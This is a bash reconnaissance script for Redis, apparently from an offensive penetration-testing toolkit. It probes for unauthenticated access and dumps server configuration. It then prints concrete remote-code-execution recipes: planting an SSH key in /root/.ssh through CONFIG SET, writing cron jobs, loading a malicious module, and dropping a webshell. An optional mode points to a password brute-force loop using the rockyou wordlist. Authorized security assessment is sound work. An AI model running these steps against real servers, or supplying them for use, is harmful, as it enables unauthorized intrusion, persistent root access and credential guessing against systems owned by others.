#!/usr/bin/env bash
# recce-service: Redis (6379) - unauth access -> RCE paths
. "$(cd "$(dirname "$0")/.." && pwd)/lib.sh"
T="$1"; P="${2:-6379}"; [ "$3" = "-a" ] && AGGR=1
svc_start "REDIS" "$T" "$P"

nse "$T" "$P" "redis-info"
# Unauthenticated PING/INFO is the whole game for Redis.
UNAUTH=0
if have redis-cli; then
  if redis-cli -h "$T" -p "$P" ping 2>/dev/null | grep -qi PONG; then
    UNAUTH=1; find_ "Redis accepts UNAUTHENTICATED commands (no requirepass)"
    info "server info:"; redis-cli -h "$T" -p "$P" info server 2>/dev/null | grep -iE 'redis_version|os:|config_file|executable' | sed 's/^/      /'
    info "role/dir:"; redis-cli -h "$T" -p "$P" config get dir 2>/dev/null | sed 's/^/      /'
  else info "AUTH required (or unreachable) - not open"; fi
else
  # Fallback with raw socket.
  R=$(printf 'PING\r\n' | timeout 6 bash -c "exec 3<>/dev/tcp/$T/$P; cat >&3; head -c 32 <&3" 2>/dev/null)
  printf '%s' "$R" | grep -qi PONG && { UNAUTH=1; find_ "Redis PING answered without auth (install redis-tools for detail)"; }
fi
if [ "$UNAUTH" = 1 ]; then
  note "RCE paths (all need write perms of the redis process):"
  note "  1) SSH key: CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET x '<pubkey>'; SAVE"
  note "  2) cron:    CONFIG SET dir /var/spool/cron; ... write a job (Redis<7 / weak-config)"
  note "  3) module:  MODULE LOAD a malicious .so (RedisModules RCE) if you can stage a file"
  note "  4) webshell: if it co-hosts a webserver, write a shell into the web root"
fi
if aggr; then sec "Redis auth brute (intrusive)"; need redis-cli && info "(brute AUTH manually: for p in \$(cat rockyou); do redis-cli -a \$p ...)"
else skip_aggr "redis AUTH password brute"; fi
